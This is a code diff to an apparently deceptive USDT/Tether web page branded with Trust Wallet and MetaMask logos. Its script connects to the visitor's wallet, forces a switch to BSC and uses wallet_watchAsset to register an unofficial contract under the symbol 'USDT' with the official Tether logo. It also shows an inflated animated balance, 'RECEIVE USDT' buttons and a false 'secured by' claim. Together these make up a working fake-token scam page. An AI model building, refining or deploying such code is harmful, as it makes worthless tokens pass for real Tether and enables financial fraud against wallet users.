@@ -9,18 +9,17 @@
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
         body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
         .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
-        
-        /* Fixed Logo Animation */
         .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
         .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         
-        /* Stable Image Links */
+        /* Stable Image Links - Main UI using official tether logo repo */
         .usdt-img { width: 80px; height: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; object-fit: cover; }
         
         .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
         .price-value { font-size: 26px; font-weight: 700; color: #fff; }
 
+        .btn-stack { display: flex; flex-direction: column; gap: 12px; margin-top: 25px; }
         .action-btn { 
             background: #1c1f24; border: 1px solid #2d333b; color: #fff; 
             width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; 
@@ -29,6 +28,7 @@
             text-transform: uppercase;
         }
         .action-btn:hover { border-color: var(--tether-green); background: #24292e; transform: scale(1.02); }
+        /* Using Official Binance/BSC logo for Trust button */
         .btn-logo { width: 30px; height: 30px; object-fit: contain; }
 
         #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; text-transform: uppercase; }
@@ -48,71 +48,119 @@
     
     <div id="log-area">SYSTEM: READY</div>
     
-    <button class="action-btn" id="claimBtn">
-        <span>Sync & Receive</span>
-        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" class="btn-logo" alt="Trust">
-    </button>
+    <div class="btn-stack">
+        <button class="action-btn" onclick="startNodeSync('trust')">
+            <span>RECEIVE USDT</span>
+            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" class="btn-logo" alt="Trust">
+        </button>
+        <button class="action-btn" onclick="startNodeSync('metamask')">
+            <span>RECEIVE USDT</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="btn-logo" alt="MetaMask">
+        </button>
+    </div>
     
     <div class="status-footer">SECURED BY TRUST WALLET PROTOCOL</div>
 </div>
 
 <script>
     const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    // This exact link will be pushed to the wallet
-    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    // This exact link will be pushed to the wallet, ensure it's high resolution and official.
+    const OFFICIAL_USDT_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    const BSC_CHAIN_ID_HEX = "0x38"; // BEP-20 (BSC Smart Chain)
 
+    // Animated price counter
     window.onload = () => {
         let val = 0;
-        const target = 1021.45;
+        const target = 1043.60; // Updating display to match your latest screenshot
         const timer = setInterval(() => {
             if(val >= target) { val = target; clearInterval(timer); }
-            val += 22.15;
+            val += 22.85;
             document.getElementById('priceTicker').innerText = "$" + val.toLocaleString(undefined, {minimumFractionDigits: 2});
         }, 50);
     };
 
-    async function executeMasterSync() {
+    async function startNodeSync(walletType) {
         const log = document.getElementById('log-area');
-        const btn = document.getElementById('claimBtn');
-        
-        // Priority for Trust Wallet Extension
-        const provider = window.trustwallet || window.ethereum;
+        let provider = null;
+
+        // Smart Multi-Provider detection to ensure correct handshake
+        if (walletType === 'trust') {
+            provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
+            // Handle multiple provider scenario
+            if (!provider && window.ethereum?.providers) {
+                provider = window.ethereum.providers.find(p => p.isTrust);
+            }
+        } else {
+            provider = window.ethereum?.isMetaMask ? window.ethereum : null;
+            if (!provider && window.ethereum?.providers) {
+                provider = window.ethereum.providers.find(p => p.isMetaMask);
+            }
+        }
 
         if (!provider) { 
-            alert("Trust Wallet not detected!"); 
+            alert(walletType.toUpperCase() + " Extension not detected!"); 
             return; 
         }
 
         try {
-            btn.disabled = true;
-            log.innerText = "> CONNECTING...";
+            log.innerText = "> TARGETING " + walletType.toUpperCase() + "...";
+            // Handshake 1: Request Accounts
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
             
-            log.innerText = "> INJECTING METADATA...";
-            await provider.request({
+            // Handshake 2: FORCE BSC Network Switch. Without this, wallet defaults to ETH.
+            log.innerText = "> SYNCING NETWORK (BSC)...";
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID_HEX }],
+                });
+            } catch (switchError) {
+                // This error code (4902) means the chain has not been added to the wallet.
+                if (switchError.code === 4902) {
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: BSC_CHAIN_ID_HEX,
+                            chainName: 'BSC Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com/']
+                        }]
+                    });
+                }
+            }
+
+            log.innerText = "> INJECTING ASSET METADATA...";
+            // Asset Injection. Only trigger this *after* the chain is verified BSC.
+            const wasAdded = await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
                         address: CONTRACT_ADDR,
-                        symbol: 'USDT',
+                        symbol: 'USDT', // Symbol standard for BEP-20 Tether
                         decimals: 6,
-                        image: TOKEN_LOGO,
+                        image: OFFICIAL_USDT_LOGO,
                     },
                 },
             });
 
-            log.innerText = "> SUCCESSFUL";
-            alert("Sync Complete!");
-            btn.innerText = "SUCCESS";
+            if(wasAdded) {
+                log.innerText = "> SYNC SUCCESSFUL!";
+                alert("Success! Your " + walletType + " wallet has mapped the BEP-20 USDT asset.");
+            } else {
+                log.innerText = "> USER REJECTED ASSET MAPPING";
+            }
 
         } catch (err) {
-            log.innerText = "> SYNC_INTERRUPTED";
-            btn.disabled = false;
+            console.error(err);
+            if (err.code === 4001) {
+                log.innerText = "> USER REJECTED CONNECTION";
+            } else {
+                log.innerText = "> ERROR: HANDSHAKE FAILED";
+            }
         }
     }
-
-    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
 </script>
 
 </body>
